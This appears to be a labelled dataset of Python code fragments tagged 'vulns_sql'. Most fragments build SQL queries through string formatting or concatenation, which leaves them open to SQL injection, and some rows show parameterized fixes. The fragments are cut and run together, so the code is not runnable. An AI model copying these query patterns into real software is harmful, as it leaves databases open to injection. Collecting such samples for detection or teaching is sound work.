"    platform = request.args.get(""platform"")    build_system_type = request.args.get(""build_system_type"")",vulns_sql
"    date = request.args.get(""date"", """")    active = request.args.get(""active"", 0)    buildbot = request.args.get(""buildbot"", 0)    branch = request.args.get(""branch"", '')    taskcluster = request.args.get(""taskcluster"", 0)    priority = request.args.get(""priority"", ""low"")",vulns_sql
    return {'jobtypes': retVal},vulns_sql
"        cur.execute('''INSERT INTO ledger (person_id, txn_date, amount, category_id, description)                        SELECT (SELECT id FROM persons WHERE person_name='%s'), '%s', %d,                        (SELECT id FROM categories WHERE cat_name='%s'), '%s' ;'''                        % (person, expense_date, amount, category, description))",vulns_sql
"        cur.execute('''INSERT INTO categories (cat_name) VALUES (%s)''', (category_name,))",vulns_sql
"        cur.execute('''UPDATE ledger SET                        person_id = (SELECT id FROM persons WHERE person_name = '%s'),                        txn_date = '%s',                        amount = '%s',                        category_id = (SELECT id FROM categories WHERE cat_name = '%s'),                        description = '%s'                        WHERE id = '%s';                    ''' % (new_person, new_date, new_amount, new_category, new_description, txn_id))",vulns_sql
        cur.execute('''DELETE FROM ledger WHERE id = '%s';''' % txn_id),vulns_sql
"                    (""Time"", True))",vulns_sql
"        if(order[1]):            query += ""ORDER BY %s DESC "" % order[0]            query += ""ORDER BY %s ASC "" % order[0]",vulns_sql
"    def execute(self, sql_query_string, and_close=False):        cursor.execute(sql_query_string)        if and_close:            self.conn.commit()            self.close()        return {""conn"": self.conn, ""cursor"": cursor if not and_close else None}        """"""Closes the current database connection""""""        return self.conn.close()    SQL = """"""INSERT INTO games (gamedesc) VALUES ('%s');""""""    DB().execute((SQL % data), True)",vulns_sql
"             VALUES ('%s', %s::integer);""""""    DB().execute((SQL % data), True)",vulns_sql
"    conn = DB().execute((SQL % data), False)",vulns_sql
"             VALUES ('%s', '%s');""""""    DB().execute((SQL % data), True)    DB().execute(SQL, True)    conn = DB().execute(SQL, False)",vulns_sql
"             WHERE lastname = ('%s');""""""    conn = DB().execute((SQL % data), False)",vulns_sql
"    DB().execute((SQL % data), True)",vulns_sql
"    DB().execute((SQL % data), True)",vulns_sql
"    DB().execute((SQL % data), True)",vulns_sql
"    conn = DB().execute((SQL % data), False)",vulns_sql
"    conn = DB().execute((SQL % data), False)",vulns_sql
"    DB().execute(SQL, True)",vulns_sql
"    DB().execute((SQL % data), True)    conn = DB().execute((SQL % data), False)",vulns_sql
"    conn = DB().execute((SQL % data), False)",vulns_sql
"            DB().execute((SQL % data), True)        DB().execute((SQL % data), True)            DB().execute((SQL % data), True)",vulns_sql
"    conn = DB().execute((SQL % data), False)",vulns_sql
"    conn = DB().execute((SQL % data), False)",vulns_sql
"        conn = DB().execute((SQL % data), False)",vulns_sql
"            DB().execute((SQL % data), True)",vulns_sql
"        DB().execute((SQL % data), True)        DB().execute((SQL % data), True)",vulns_sql
"        conn = DB().execute((SQL % data), False)",vulns_sql
"            DB().execute((SQL % data), True)",vulns_sql
"    conn = DB().execute((SQL % data), False)        DB().execute((SQL % data), True)",vulns_sql
"    DB().execute((SQL % data), True)",vulns_sql
"    conn = DB().execute((SQL % data), False)",vulns_sql
"    conn = DB().execute((SQL % data), False)",vulns_sql
"    conn = DB().execute(SQL, False)",vulns_sql
"    conn = DB().execute(SQL, False)",vulns_sql
"    conn = DB().execute(SQL, False)    print tabulate(tournaments, headers=(['ID', 'Player']),    conn = DB().execute(SQL, False)",vulns_sql
"  c.execute(""INSERT INTO posts (content) VALUES ('%s')"" % content)",vulns_sql
"    voters = db.execute(""SELECT voters FROM votes where chan='{}' and action='{}' and target like '{}'"".format(chan,action,target)).fetchone()",vulns_sql
"    if votefinished: db.execute(""DELETE FROM votes where chan='{}' and action='{}' and target like '{}'"".format(chan,action,target))",vulns_sql
"    cursor.execute(""INSERT INTO players (name) VALUES ('%s')"" % (name,));",vulns_sql
"        print ""answer"", answer        answer + result",vulns_sql
"    cursor.execute(""INSERT INTO playsRecord (winner, loser) VALUES ('%s', '%s')"" % (winner, loser));",vulns_sql
"    voters = db.execute(""SELECT voters FROM votes where chan='{}' and action='{}' and target like '{}'"".format(chan,action,target)).fetchone()",vulns_sql
"    if votefinished: db.execute(""DELETE FROM votes where chan='{}' and action='{}' and target like '{}'"".format(chan,action,target))",vulns_sql
"        db.execute(""INSERT INTO polls (question, active) VALUES ('{}', 1)"".format(question))",vulns_sql
"        poll = db.execute(""SELECT pollID, question FROM polls WHERE pollID = '{}'"".format(pollID))    for (index, answer, votes) in db.execute(""SELECT 'index', answer, count(voteID) FROM answers LEFT JOIN votes ON votes.answerID = answers.answerID WHERE pollID = {} GROUP BY answers.answerID, 'index', answer ORDER BY 'index' ASC"".format(pollID, )):",vulns_sql
"    answers = db.execute(""SELECT answerID FROM answers WHERE pollID = %s AND 'index' = %s"" % (pollID, answerIndex))    db.execute(""DELETE FROM votes WHERE nick = %s AND answerID IN (SELECT answerID FROM answers WHERE pollID = %s)"", (sender, pollID))    db.execute(""INSERT INTO votes (answerID, nick) VALUES (%s, %s)"", (answerID, sender))",vulns_sql
"    maxIndex = db.execute(""SELECT MAX('index') FROM answers WHERE answers.pollID = %s"", pollID)[0][0]    db.execute(""INSERT INTO answers (pollID, 'index', answer) VALUES (%s, %s, %s)"", (pollID, index, answer))    answerID = db.execute(""SELECT answerID FROM answers WHERE pollID = %s AND 'index' = %s"", (pollID, index))[0][0]    db.execute(""DELETE FROM votes WHERE nick = %s AND answerID IN (SELECT answerID FROM answers WHERE pollID = %s)"", (sender, pollID))    db.execute(""INSERT INTO votes (answerID, nick) VALUES (%s, %s)"", (answerID, sender))",vulns_sql
"    polls = db.execute(""SELECT pollID, question FROM polls WHERE question LIKE %s"", ('%' + searchTerm + '%',))",vulns_sql
"        winners = db.execute(""SELECT answer, count(voteID) FROM answers INNER JOIN votes ON votes.answerID = answers.answerID WHERE pollID = %s GROUP BY answers.answerID, answer ORDER BY count(voteID) DESC LIMIT 1"", (pollID, ))",vulns_sql
"    if len(db.execute(""SELECT pollID FROM polls WHERE pollID = %s"", (pollID, ))) == 0:    db.execute(""DELETE FROM votes WHERE answerID IN (SELECT answerID FROM answers WHERE pollID = %s)"", (pollID, ))    db.execute(""DELETE FROM answers WHERE pollID = %s"", (pollID, ))    db.execute(""DELETE FROM polls WHERE pollID = %s"", (pollID, ))",vulns_sql
"            c.execute(""INSERT INTO edge VALUES ('"" + document.id + ""', '"" + document.__class__.__name__ + ""', '"" + edge.__class__.__name__ + ""', '"" + edge.edgeid + ""', "" +                ""'"" + startnode1id + ""', '"" + startnode2id + ""', '"" + edge.endnode + ""', '"" + edge.propertyownerid + ""', '"" + edge.propertyname + ""', '"" + str(edge.propertyvalue) + ""', ""                ""'"" + propertytypename + ""')"")",vulns_sql
"    sql = ""INSERT INTO "" + documentobject.__class__.__name__ + "" VALUES ('"" + documentobject.id + ""'""        if columntype == ""int"":            quote = """"        elif columntype == ""text"":            quote = ""'""        else:            assert False            quote = """"        sql += "",""            sql += quote + parentobject.id + quote            sql += quote + str(getattr(documentobject, columnname)) + quote    self.database.execute(sql)",vulns_sql
"        c.execute(""INSERT OR IGNORE INTO edge VALUES ('"" + edge.documentid + ""', '"" + edge.documentclassname + ""', '"" + edge.__class__.__name__ + ""', '"" + edge.edgeid + ""', "" +                ""'"" + startnode1id + ""', '"" + startnode2id + ""', '"" + edge.endnode + ""', '"" + edge.propertyownerid + ""', '"" + edge.propertyname + ""', '"" + str(edge.propertyvalue) + ""', ""                ""'"" + propertytypename + ""')"")",vulns_sql
"        if columntype == ""int"":            quote = """"        elif columntype == ""text"":            quote = ""'""        else:            assert False            quote = """"        sql += "",""            sql += quote + parentobject.id + quote            sql += quote + str(getattr(documentobject, columnname)) + quote    database.execute(sql)",vulns_sql
"    cursor.execute(""SELECT * FROM players WHERE id=%s"" % player)    cursor.execute(""DELETE FROM players WHERE id = %s"" % player)",vulns_sql
"    cursor.execute(""SELECT * FROM players WHERE id=%s"" % player)                   ""WHERE id=%s"" % (player_name, player_country, player))",vulns_sql
"    cursor.execute(""SELECT * FROM players WHERE id=%s"" % p1)",vulns_sql
"                                     ""WHERE code=\'%s\'"" % p1_code)    cursor.execute(""SELECT * FROM players WHERE id=%s"" % p2)",vulns_sql
"                                     ""WHERE code=\'%s\'"" % p2_code)        cursor.execute(""SELECT * FROM players WHERE id=%s"" % p2)",vulns_sql
"                   ""VALUES (\'%s\', \'%s\', \'%s\');"" % (winner, loser, ts))",vulns_sql
"    cursor.execute(""DELETE FROM matches where id=%s"" % match)",vulns_sql
"                       ""WHERE code=\'%s\'"" % row[3])",vulns_sql
"                       ""WHERE player_1='%s'"" % player[3])                       ""WHERE player_2='%s'"" % player[3])",vulns_sql
"            tournament.deletePlayer(player=""38471237401238"")            tournament.editPlayer(player=""38471237401238"",",vulns_sql
"    cursor.execute(""SELECT * FROM players WHERE id=%s"", player)    cursor.execute(""DELETE FROM players WHERE id = %s"", player)",vulns_sql
"    cursor.execute(""SELECT * FROM players WHERE id=%s"", player)                   ""SET name=\'%s\', country=\'%s\' """,vulns_sql
"    cursor.execute(""SELECT * FROM players WHERE id=%s"", p1)",vulns_sql
"                                     ""WHERE code=\'%s\'"", p1_code)    cursor.execute(""SELECT * FROM players WHERE id=%s"", p2)",vulns_sql
"                                     ""WHERE code=\'%s\'"", p2_code)        cursor.execute(""SELECT * FROM players WHERE id=%s"", p2)",vulns_sql
"    cursor.execute(""DELETE FROM matches where id=%s"", match)",vulns_sql
"                       ""WHERE code=\'%s\'"", row[3])",vulns_sql
"                       ""WHERE player_1='%s'"", player[3])                       ""WHERE player_2='%s'"", player[3])",vulns_sql
"                                     ""WHERE code=\'%s\'"", (p1_code,))",vulns_sql
"                                     ""WHERE code=\'%s\'"", (p2_code,))",vulns_sql
"                   ""VALUES (\'%s\', \'%s\', \'%s\');"", (winner, loser, ts))",vulns_sql
"                       ""WHERE code=\'%s\'"", (row[3],))",vulns_sql
"                       ""WHERE player_1='%s'"", (player[3],))                       ""WHERE player_2='%s'"", (player[3],))",vulns_sql
"import timeimport psycopg2def GetAllPosts():    conn = psycopg2.connect(""dbname=forum"")    cur = conn.cursor()    cur.execute(""SELECT time, content FROM posts ORDER BY time desc"")    posts = ({'content': str(row[1]), 'time': str(row[0])}    for row in cur.fetchall())    conn.close()    return postsdef AddPost(content):    conn = psycopg2.connect(""dbname=forum"")    cur = conn.cursor()    cur.execute(""INSERT INTO posts (content) VALUES ('%s')"" % content)    conn.commit()    conn.close()",vulns_sql
import MySQLdb,vulns_sql
"	db = MySQLdb.connect(HOST_NAME, USER_NAME, USER_PASS, TABL_NAME)	print ""\nPython-MySQL Result Object\n=============================""	result = cursor.fetchone()",vulns_sql
"	db = MySQLdb.connect(HOST_NAME, USER_NAME, USER_PASS, TABL_NAME)	c.execute(""SELECT * FROM Player WHERE Username = \"""" + username + ""\"""")	print ""\nOutput:\n""print (get_player(""steve""))print ""\n""",vulns_sql
"        print ""The SQL injection attack failed""        print ""The SQL injection attack was prevented""        print ""The SQL injection attack succeeded""",vulns_sql
"    c.execute(""SELECT hash, salt FROM users WHERE username = ?"", (username,))",vulns_sql
"        c.execute(""UPDATE users SET active = ? WHERE username = ?"", (1, username))",vulns_sql
"        c.execute(""SELECT hash, salt FROM users WHERE username = ?"", (username, ))            c.execute(""UPDATE users SET hash = ?, salt = ? WHERE username = ?"", (new_hash_salt[0], new_hash_salt[1], username))",vulns_sql
"        cursor.execute('SELECT * FROM comics WHERE num=""%s""' % current_num)",vulns_sql
"    cursor.execute('INSERT INTO comics VALUES (""%s"")' % num)",vulns_sql
"    def _query(self, query):        res = self.cxn.query(query)",vulns_sql
"                 ""('%s', '%s');"" % (self.table, id, now))            self._query(query)",vulns_sql
"        if metadata:            extra = []            for (n, v) in metadata.iteritems():                if type(v) in (int, long):                    extra.append('%s = %s' % (n, v))                else:                    extra.append(""%s = '%s'"" % (n, v))            extraq = ', '.join(extra)            query = (""UPDATE %s SET data = '%s', %s, timeModified = '%s' ""                     ""WHERE identifier = '%s';"" %                     (self.table, ndata, extraq, now, id)                     )        else:            query = (""UPDATE %s SET data = '%s', timeModified = '%s' ""                     ""WHERE  identifier = '%s';"" %                     (self.table, ndata, now, id)                     )            self._query(query)",vulns_sql
"        query = (""SELECT data FROM %s WHERE identifier = '%s';"" %                 (self.table, sid)        res = self._query(query)",vulns_sql
"        query = ""DELETE FROM %s WHERE identifier = '%s';"" % (self.table, sid)        self._query(query)",vulns_sql
"        query = (""SELECT %s FROM %s WHERE identifier = '%s';"" %                 (mType, self.table, id)        res = self._query(query)            data = res.dictresult()[0][mtype]            if mtype.endswith((""Count"", ""Position"", ""Amount"", ""Offset"")):",vulns_sql
"        query = (""UPDATE %s SET %s = %r WHERE identifier = '%s';"" %                 (self.table, mType, value, id)            self._query(query)",vulns_sql
"        query = ""DELETE FROM %s WHERE expires < '%s';"" % (self.table, nowStr)        self._query(query)",vulns_sql
"            values.append(repr(oid))            if isinstance(value, basestring) and value.find(""'"") > -1:                values.append(""'{0}'"".format(value.replace(""'"", r""\'"")))            else:                values.append(repr(value))                 (self.table, relation, ', '.join(fields), ', '.join(values))        self._query(query)",vulns_sql
"            conds.append(""%s = %r"" % (self.table, oid))            conds.append(""%s = %r"" % (name, value))        self._query(query)",vulns_sql
"            conds.append(""%s = %r"" % (self.table, oid))            conds.append(""%s = %r"" % (name, value))        res = self._query(query)",vulns_sql
"                 ""('%s', '%s', %s, '%s', '%s', '%s', '%s')"" %                 (self.table,                  id,                  ndata,                  len(rset),                  cl,                  nowStr,                  nowStr,                  expiresStr                  )            self._query(query)                query = (""UPDATE %s SET data = '%s', size = %s, ""                         ""class = '%s', timeAccessed = '%s', expires = '%s' ""                         ""WHERE identifier = '%s';"" %                         (self.table,                          ndata,                          len(rset),                          cl,                          nowStr,                          expiresStr,                          id                          )                self._query(query)",vulns_sql
"                         ""('%s', '%s', %s, '%s', '%s', '%s', '%s')"" %                         (self.table,                          id,                          ndata,                          len(rset),                          cl,                          nowStr,                          nowStr,                          expiresStr                          )                self._query(query)",vulns_sql
"        query = (""SELECT class, data FROM %s WHERE identifier = '%s';"" %                 (self.table, sid)        res = self._query(query)",vulns_sql
"        query = (""UPDATE %s SET timeAccessed = '%s', expires = '%s' ""                 ""WHERE identifier = '%s';"" %                 (self.table, nowStr, expiresStr, sid)        self._query(query)",vulns_sql
"        query = ""DELETE FROM %s WHERE identifier = '%s';"" % (self.table, sid)        self._query(query)",vulns_sql
"        'sql': ['PyGreSQL >= 3.8.1'],",vulns_sql
"        if isinstance(value, basestring):            value = ""'%s'"" % value.encode('utf-8').replace('\\', r'\\')        elif isinstance(value, models.Model):            value = str(value.id)        elif value is None:            value = 'NULL'        else:            value = str(value)        sql.extend((connection.ops.quote_name(field.column), '=', value, ','))    sql.extend(['WHERE', 'id', '=', str(self.id)])    connection.cursor().execute(sql)",vulns_sql
"        if isinstance(value, basestring):            value = ""'%s'"" % value.encode('utf-8').replace('\\', r'\\')        elif isinstance(value, models.Model):            value = str(value.id)        elif value is None:            value = 'NULL'        else:            value = str(value)        sql.extend((connection.ops.quote_name(field.column), '=', value, ','))    sql.extend(['WHERE', 'id', '=', str(self.id)])    connection.cursor().execute(sql)",vulns_sql
"        if isinstance(value, basestring):            value = ""'%s'"" % value.encode('utf-8').replace('\\', r'\\')        elif isinstance(value, models.Model):            value = str(value.id)        elif value is None:            value = 'NULL'        else:            value = str(value)        sql.extend((connection.ops.quote_name(field.column), '=', value, ','))    sql.extend(['WHERE', 'id', '=', str(self.id)])    connection.cursor().execute(sql)",vulns_sql
"        if isinstance(value, basestring):            value = ""'%s'"" % value.encode('utf-8').replace('\\', r'\\')        elif isinstance(value, models.Model):            value = str(value.id)        elif value is None:            value = 'NULL'        else:            value = str(value)        sql.extend((connection.ops.quote_name(field.column), '=', value, ','))    sql.extend(['WHERE', 'id', '=', str(self.id)])    connection.cursor().execute(sql)",vulns_sql
"        if isinstance(value, basestring):            value = ""'%s'"" % value.encode('utf-8').replace('\\', r'\\')        elif isinstance(value, models.Model):            value = str(value.id)        elif value is None:            value = 'NULL'        else:            value = str(value)        sql.extend((connection.ops.quote_name(field.column), '=', value, ','))    sql.extend(['WHERE', 'id', '=', str(self.id)])    connection.cursor().execute(sql)",vulns_sql
"    cursor.execute(""insert into posts values (%s)"", (content,))",vulns_sql
"		sql = ""SELECT * FROM index WHERE ngram='"" + nGram + ""';""		cursor.execute(sql)",vulns_sql
@app.before_requestdef log_request():    return  # TODO: add request logger,vulns_sql
"        lat_range = [float(loclat) - geodist, float(loclat) + geodist]        lng_range = [float(loclng) - geodist, float(loclng) + geodist]",vulns_sql
"        lat_range = [float(loclat) - geodist, float(loclat) + geodist]        lng_range = [float(loclng) - geodist, float(loclng) + geodist]",vulns_sql
    while(not valid):    return index,vulns_sql
"def player_in_url(db, player, urls):",vulns_sql
"    austin = constants.AUSTIN_URLS    smashbrews = constants.SMASHBREWS_RULS    colorado = constants.COLORADO_SINGLES_URLS    colorado_doubles = constants.COLORADO_DOUBLES_URLS    sms = constants.SMS_URLS    base_urls = [sms, smashbrews, austin, colorado_doubles, colorado]    return base_urls",vulns_sql
"    sql = ""select date from matches where scene='{}' order by date limit 1;"".format(scene)    res = db.exec(sql)",vulns_sql
"    sql = ""select date from matches where scene='{}' order by date desc limit 1;"".format(scene)    res = db.exec(sql)",vulns_sql
"    sql = ""select date from ranks where scene='{}' and player='{}' order by date limit 1;"".format(scene, player)    res = db.exec(sql)    sql = ""select date from ranks where scene='{}' and player='{}' order by date desc limit 1;"".format(scene, player)    res = db.exec(sql)",vulns_sql
"    sql = ""SELECT date, rank FROM ranks WHERE scene='{}' AND player='{}'"".format(scene, tag)    res = db.exec(sql)",vulns_sql
"    sql = ""SELECT DISTINCT scene FROM ranks WHERE player='{}'"".format(tag)    scenes = db.exec(sql)",vulns_sql
"    arank = get_monthly_ranks_for_scene(db, 'austin', 'christmasmike')",vulns_sql
"            matches.url=placings.url where scene='{}' and ((player1='{}' and placings.player=player1) or \            (player2='{}' and placings.player=player2));"".format(scene, tag, tag)    print(sql)    res = db.exec(sql)",vulns_sql
"    sql = ""SELECT DISTINCT scene FROM ranks WHERE player='{}'"".format(tag)    scenes = db.exec(sql)",vulns_sql
"    sql = ""select url, date from matches where scene='{}' and date like '%{}%' group by url, date order by date"".format(scene, ym_date)    res = db.exec(sql)",vulns_sql
"    if player_in_url(db, tag, urls=tournaments):    sql = ""select url, date from matches where scene='{}' and date<='{}' group by url, date order by date desc limit {};"".format(scene, date, limit)    res = db.exec(sql)    sql = ""select url, date from matches where scene='{}' and date>='{}' group by url, date order by date desc limit {};"".format(scene, date, limit)    res = db.exec(sql)",vulns_sql
"        sql = ""SELECT * FROM matches WHERE url='{}';"".format(url)        res = set(db.exec(sql))",vulns_sql
"	['hakii', 'su l hakii', 'su | hakii', 'su redriot i hakii', 'hih | hakii', 'su | sleepyhakii', 'su|hakii', 'su | hakii $', 'su  redriot i hakii', 'hoh | hakii', 'su| hakii'],",vulns_sql
"AUSTIN_URLS = ('austin', {'enumerated': ['http://challonge.com/heatwave###', 'https://challonge.com/NP9ATX###', 'http://challonge.com/hw###', 'https://challonge.com/alibaba###'], 'users': ['https://challonge.com/users/kuya_mark96', 'https://austinsmash4.challonge.com']})SMS_URLS = ('sms', {'enumerated': ['http://challonge.com/RAA_###', 'http://challonge.com/SMSH_###'], 'users': ['https://challonge.com/users/yellocake']})",vulns_sql
        'RAA': 'Reading At Alkek'},vulns_sql
"    sql = ""SELECT count(*) FROM matches WHERE winner='{}'"".format(tag)    wins = db.exec(sql)[0][0]    sql = ""SELECT count(*) FROM matches WHERE (player1='{}' or player2='{}') AND NOT winner='{}'"".format(tag, tag, tag)    losses = db.exec(sql)[0][0]    sql = ""select rank from players join ranks where players.scene=ranks.scene and players.tag=ranks.player and players.tag='{}' order by date desc limit 1;"".format(tag)    res = db.exec(sql)    sql = ""SELECT scene FROM players WHERE tag='{}'"".format(tag)    scene = db.exec(sql)[0][0].capitalize()",vulns_sql
"        sql = ""SELECT distinct date FROM ranks WHERE scene='{}' ORDER BY date DESC LIMIT 1;"".format(scene)        res = db.exec(sql)    sql = ""SELECT * FROM ranks WHERE scene = '{}' and date='{}'"".format(scene, date)    res = db.exec(sql)",vulns_sql
"    sql = ""SELECT * FROM ranks WHERE scene = '{}' and date='{}'"".format(scene, prev_date)    res = db.exec(sql)",vulns_sql
"    sql = ""SELECT * FROM matches WHERE winner = '""+str(player)+""' ORDER BY date DESC;""    result = db.exec(sql)",vulns_sql
"    sql = ""SELECT * FROM matches WHERE (player1 = '""+str(player)+""' OR ""\            +""player2 = '""+str(player)+""') AND winner != '""+str(player)+""' ORDER BY date DESC;""    result = db.exec(sql)",vulns_sql
"    sql = ""SELECT * FROM matches WHERE (player1 = '""+str(player1)+""' OR ""\            +""player2 = '""+str(player1)+""') AND (player1 = '""+str(player2)+""' OR ""\            +""player2 = '""+str(player2)+""') ORDER BY date DESC;""    result = db.exec(sql)",vulns_sql
"    sql = ""SELECT * FROM placings WHERE player = '{}'"".format(tag)    results = list(db.exec(sql))",vulns_sql
"        sql = ""select * from matches where (player1='{}' or player2='{}') and date<='{}' and date>='{}'"".format(tag, tag, date, previous_date);         data = db.exec(sql)",vulns_sql
"                where winner='{}' and player2='{}' and date='{}';"".format(tag, tag, date)        data = db.exec(sql)                where winner='{}' and player1='{}' and date='{}';"".format(tag, tag, date)        data = data + db.exec(sql)",vulns_sql
"                where winner!='{}' and player2='{}' and date='{}';"".format(tag, tag, date)        data = db.exec(sql)                where winner!='{}' and player1='{}' and date='{}';"".format(tag, tag, date)        data = data + db.exec(sql)",vulns_sql
"        frm = 'from matches join ranks where ((ranks.player=matches.player1 and matches.player2=""{}"")'.format(tag)        player_where = 'or (ranks.player=matches.player2 and matches.player1=""{}"")) and winner=""{}""'.format(tag, tag)        also_date_where = 'and ranks.date=""{}""'.format(date)        scene_where = 'and ranks.scene=""{}""'.format(scene)        data = db.exec(sql)",vulns_sql
"        frm = 'from matches join ranks where ((ranks.player=matches.player1 and matches.player2=""{}"")'.format(tag)        player_where = 'or (ranks.player=matches.player2 and matches.player1=""{}"")) and not winner=""{}""'.format(tag, tag)        also_date_where = 'and ranks.date=""{}""'.format(date)        scene_where = 'and ranks.scene=""{}""'.format(scene)        data = db.exec(sql)",vulns_sql
"        sql = ""SELECT * FROM analyzed WHERE base_url = '"" + str(bracket) + ""';""        result = self.db.exec(sql)",vulns_sql
"            success = get_results.process(bracket, scene, self.db, display_name)",vulns_sql
"                get_results.process(bracket, scene, self.db, display_name)                self.insert_placing_data(bracket, new_bracket)        LOG.info('we have called insert placing data on bracket {}'.format(bracket))",vulns_sql
"            sql = ""INSERT INTO placings (url, player, place) VALUES "" \                    + "" ('{}', '{}', '{}')"".format(bracket, player, placing)            self.db.exec(sql)",vulns_sql
"        sql = 'select count(*) from ranks where scene=""{}"";'.format(scene)        res = self.db.exec(sql)",vulns_sql
"            sql = ""select date from ranks where scene='{}' order by date desc limit 1;"".format(scene)            res = self.db.exec(sql)",vulns_sql
"        sql = ""SELECT * FROM ranks WHERE scene = '{}' AND date='{}';"".format(str(scene), recent_date)        res = self.db.exec(sql)",vulns_sql
"            sql = ""INSERT INTO ranks (scene, player, rank, points, date) VALUES ('{}', '{}', '{}', '{}', '{}');""\                    .format(str(scene), str(player), int(rank), str(points), str(recent_date))            self.db.exec(sql)            sql = ""SELECT scene FROM players WHERE tag='{}';"".format(player)            res = self.db.exec(sql)",vulns_sql
        global should_tweet        sql = 'SELECT count(*) FROM matches'        res = self.db.exec(sql)        if res[0][0] == 0:            should_tweet = True,vulns_sql
"            name = [scene.get_name() for scene in chunk]            t = Thread(target=self.analyze_scenes, name=str(name), args=(chunk,))            LOG.info('Trying to start the analysis thread for scenes {}'.format(t.name))            t.start()            threads.append(t)",vulns_sql
"            sql = ""SELECT * FROM analyzed where base_url='{}'"".format(url)            res = self.db.exec(sql)",vulns_sql
"            sql = ""SELECT * FROM user_analyzed WHERE user='{}';"".format(user)            results = self.db.exec(sql)",vulns_sql
"                    sql = ""SELECT * FROM user_analyzed WHERE url='{}' AND user='{}';"".format(bracket, user)                    results = self.db.exec(sql)",vulns_sql
"                        sql = ""INSERT INTO user_analyzed (url, user, scene) VALUES ('{}', '{}', '{}');"".format(bracket, user, name)                        self.db.exec(sql)",vulns_sql
"                    sql = ""INSERT INTO user_analyzed (url, user, scene) VALUES ('{}', '{}', '{}');"".format(url, user, name)                    self.db.exec(sql)",vulns_sql
"            sql = ""SELECT first,last FROM valids WHERE base_url = '"" + str(base_url) + ""';""            result = self.db.exec(sql)",vulns_sql
"                    sql = ""UPDATE valids SET last="" + str(new_last) + "" where base_url = '""+str(base_url)+""';""                    self.db.exec(sql)",vulns_sql
"                sql = ""INSERT INTO valids (base_url, first, last, scene) VALUES (""                sql += ""'""+str(base_url)+""', ""+str(first)+ "", ""+str(last)+"", '""+str(name)+""');""                self.db.exec(sql)",vulns_sql
"    id ASC"",(argv[4],))",vulns_sql
"        conn.execute(""create table "" + i + "" (problems INTEGER, diff CHAR)"")",vulns_sql
"                    conn.execute(""insert into "" + s[3] + "" values (?, ?)"", (a, b))",vulns_sql
"        conn.execute(""create table "" + str(i) + "" (link STRING)"")",vulns_sql
"    old = """"",vulns_sql
"                    cursor.execute(""select * from result where problem = '"" + s[3] + ""'and diff = '"" + s[4] + ""'"")                        cursor.execute(""update result set verdict = '"" + s2[1] + ""' where problem = '"" + s[3] + ""' and diff = '"" + s[4] + ""'"")                        cursor.execute(""update result set verdict = '"" + s2[1] +""' where problem = '"" + s[3] + ""' and diff = '"" + s[4] + ""'"")    conn.execute(""select * from users where chat_id = '"" + str(chat_id) + ""'"")        conn.execute(""update users set username = '"" + str(username) + ""' where chat_id = '"" + str(chat_id) + ""'"")        conn.execute(""update users set last_update = '"" + str(last_try) + ""' where chat_id = '"" + str(chat_id) + ""'"")        conn.execute(""update users set last_problem = '"" + str(last_problem[0]) + ""' where chat_id = '"" + str(chat_id) + ""'"")        conn.execute(""update users set state = '"" + str(1) + ""' where chat_id = '"" + str(chat_id) + ""'"")",vulns_sql
"def get_unsolved_problem(tag, username):    tasks = list()    list_of_current_diff = list()    def find_intersection(tag):        conn = sqlite3.connect(os.path.abspath(os.path.dirname(__file__)) + ""\\users\\"" + username + '.db')        conn2 = sqlite3.connect(os.path.abspath(os.path.dirname(__file__)) + '\\cf.db')        cursor = conn.cursor()        cursor2 = conn2.cursor()        cursor2.execute(""SELECT * FROM "" + tag)        a = list()        problem_and_diff = cursor2.fetchone()        while problem_and_diff != None:            cursor.execute(""SELECT * FROM result WHERE problem = '"" + str(problem_and_diff[0]) + ""' AND diff = '"" + str(problem_and_diff[1]) + ""' AND NOT verdict = 'OK'"")            problem_and_diff_and_ok = cursor.fetchone()            if problem_and_diff_and_ok != None and problem_and_diff_and_ok in tasks:                a.append(problem_and_diff_and_ok)            problem_and_diff = cursor2.fetchone()        conn.close()        conn2.close()        return a    list_of_current_tags = list()    for i in available_tags:        if i in tag:            list_of_current_tags.append(i)    f = False    if len(list_of_current_tags) == 0 and list_of_current_diff !=0:        list_of_current_tags = available_tags.copy()        f = True    if len(list_of_current_tags) == 0 and len(list_of_current_diff) == 0:        return ""Plz try again""    if len(list_of_current_diff) == 0 and len(list_of_current_tags) != 0:        list_of_current_diff = available_diff.copy()        f = True            cursor.execute(""SELECT * FROM result WHERE problem = '"" + str(problem_and_diff[0]) + ""' AND diff = '"" + str(                problem_and_diff[1]) + ""' AND NOT verdict = 'OK'"")    if not f:        for i in range(1, len(list_of_current_tags)):            tasks = find_intersection(list_of_current_tags[i])",vulns_sql
"def create_stats_picture(username):    a = list()    b = list()    leg = list()    sum = 0            cursor.execute(""SELECT * FROM result WHERE problem = '"" + str(x[0]) + ""' AND diff = '"" + str(                x[1]) + ""' AND verdict = 'OK'"")        a.append(Pair(count, i))        sum += count    if sum == 0:        return True    for i in range(len(a)):        if a[i].first / sum != 0:            b.append(a[i].first / sum)            leg.append(a[i].second)    ax1.pie(b,  autopct='%1.1f%%',",vulns_sql
"def create_text_stats(username):    verdict = {""COMPILATION_ERROR"" : 0, ""OK"" : 0, ""TIME_LIMIT_EXCEEDED"" : 0, ""WRONG_ANSWER"" : 0, ""RUNTIME_ERROR"" : 0, ""MEMORY_LIMIT_EXCEEDED"" : 0}    colors = ['red', 'green', 'tan', 'blue', 'purple', 'orange']    a = list()    b = list()            cursor.execute(""SELECT * FROM result WHERE problem = '"" + str(x[0]) + ""' AND diff = '"" + str(x[1]) + ""'"")",vulns_sql
"        a.append(i)        b.append(verdict[i])    ax1.pie(b, labels = b, colors = colors,    ax1.legend(a)    conn.close()    conn2.close()    s = username + "" has at least one submissions in "" + str(count) + "" problems""    return s",vulns_sql
"            query = ""INSERT INTO crimes (description) VALUES ('{}');"".format(data)                cursor.execute(query)",vulns_sql
"            query = ""INSERT INTO crimes (description) VALUES (%s);""                cursor.execute(query, data)                connection.commit()        finally:            connection.close()",vulns_sql
"  def execute(sql, cursor=False):      result = _cursor.execute(sql)",vulns_sql
"  def execute_and_fetch(sql, as_row=False):      cursor = DBManager.execute(sql, cursor=True)",vulns_sql
"  def execute_and_fetch_all(sql, as_list=False):      cursor = DBManager.execute(sql, cursor=True)",vulns_sql
"    output_array = list()    for boundary_name in boundary_names:        output_dict = dict()        output_dict[""boundary""] = boundary_name        boundary_table = ""{0}.{1}"".format(settings[""web_schema""], boundary_name)        i = 0        feature_array = list()        for row in rows:            feature_dict = dict(row)            feature_dict[""id""] = feature_dict[""id""].lower()            feature_dict[""table""] = feature_dict[""table""].lower()",vulns_sql
